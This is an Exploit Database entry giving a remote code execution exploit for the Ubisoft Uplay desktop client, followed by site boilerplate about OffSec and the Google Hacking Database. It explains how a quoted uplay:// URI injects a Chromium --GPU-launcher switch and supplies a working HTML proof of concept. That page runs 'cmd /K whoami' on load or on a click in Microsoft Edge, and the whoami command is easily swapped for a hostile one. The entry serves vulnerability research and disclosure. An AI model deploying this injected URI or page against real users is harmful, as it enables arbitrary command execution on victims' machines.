# Exploit Title: Ubisoft Uplay Desktop Client 63.0.5699.0 - Remote Code Execution
# Date: 2018-09-01
# Exploit Author: Che-Chun Kuo
# Vulnerability Type: URI Parsing Command Injection
# Vendor Homepage: https://www.ubisoft.com/en-us/
# Software Link: https://uplay.ubi.com/
# Version: 63.0.5699.0
# Tested on: Windows, Microsoft Edge
# Advisory: https://forums.ubi.com/showthread.php/1912340-Uplay-PC-Client-July-17th-2018
# CVE: N/A

# Vulnerability
# The Uplay desktop client does not properly validate user-controlled data passed to its custom
# uplay URI protocol handler. This flaw can be used to exploit the Chromium Embedded Framework (CEF)
# integrated within the Uplay client, allowing for arbitrary code execution.

# Installing Uplay registers the following custom uplay protocol handler:
# HKEY_CLASSES_ROOT
#	uplay
#		(Default) = "URL:uplay Protocol"
#		URL Protocol = ""
#			DefaultIcon
#				(Default) = "upc.exe"
#		Shell
#			Open
#			Command
#				(Default) = "C:\Program Files (x86)\Ubisoft\Ubisoft Game Launcher\upc.exe" "%1"

# The %1 will be replaced with arguments from the URI. The following crafted URI performs arbitrary code execution:

	'uplay://foobar" --GPU-launcher="cmd /K whoami &" --'

# When a victim opens this URI, the string is passed to the Windows ShellExecute function.
# Microsoft states the following: "When ShellExecute executes the pluggable protocol handler with a
# string on the command line, any non-encoded spaces, quotes, and backslashes in the URI will
# be interpreted as part of the command line. This means that if you use C/C++’s argc and
# argv to determine the arguments passed to your application, the string may be broken
# across multiple parameters."

# "Malicious parties could use additional quote or backslash characters to pass additional command
# line parameters. For this reason, pluggable protocol handlers should assume that any parameters on
# the command line could come from malicious parties, and carefully validate them."

# The Uplay desktop client does not properly validate user-controlled data. An attacker can inject
# certain Chromium flags that allow for arbitrary code execution. The malicious URI breaks the
# command line with a quote character and inserts a new switch called --GPU-launcher. Since the
# Uplay client uses the Chromium Embedded Framework (CEF), Chromium command lines switches are supported.
# The --GPU-launcher switch provides a method to execute arbitrary commands. The following string shows
# the final command, which opens the Windows command prompt and executes the whoami program.

	"C:\Program Files (x86)\Ubisoft\Ubisoft Game Launcher\upc.exe" "foobar" --GPU-launcher="cmd /K whoami &" --"

# Attack Scenario
# The following attack scenario would result in the compromise of a victim's machine with the vulnerable
# Uplay client installed. A user running Microsoft Edge visits a specially crafted webpage or clicks on a
# specially crafted link. The user is served with the prompt: Did you mean to switch apps? Microsoft Edge
# is trying to open "UPlay launcher". After the user gives consent, the vulnerable application runs,
# resulting in arbitrary code execution in the context of the current process.

# This scenario also works on IE, but the IE browser shows the URI string to be opened and warns users against
# opening untrusted content. Microsoft Edge provides no such warning. Chrome and Firefox both escape
# illegal characters before passing the URI to the protocol handler.

# After Uplay desktop client (upc.exe) is run, upc.exe will attempt to open additional executables
# before the --GPU-launcher is activated. One notable executable is the UplayService.exe. UplayService
# requires elevated privileges. If the user is a non-administrative user a UAC prompt will appear.
# It should be noted, this UAC prompt doesn't prevent command execution from occurring.
# Regardless of which option the user chooses within the UplayService UAC prompt (Yes/No),
# command execution will still occur once the code that passes the --GPU-launcher switch
# to the CEF is triggered within upc.exe.

# Proof of Concept
# The following POC provides two avenues to trigger the vulnerability within Microsoft Edge.
# The first method triggers when the webpage is opened. The second method triggers when the
# hyperlink is clicked by a user.

<!doctype html>
<a href='uplay://foobar" --GPU-launcher="cmd /K whoami &" --'>ubisoft uplay desktop client rce poc</a>

<script>
  window.location = 'uplay://foobar" --GPU-launcher="cmd /K whoami &" --'
</script>

```

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
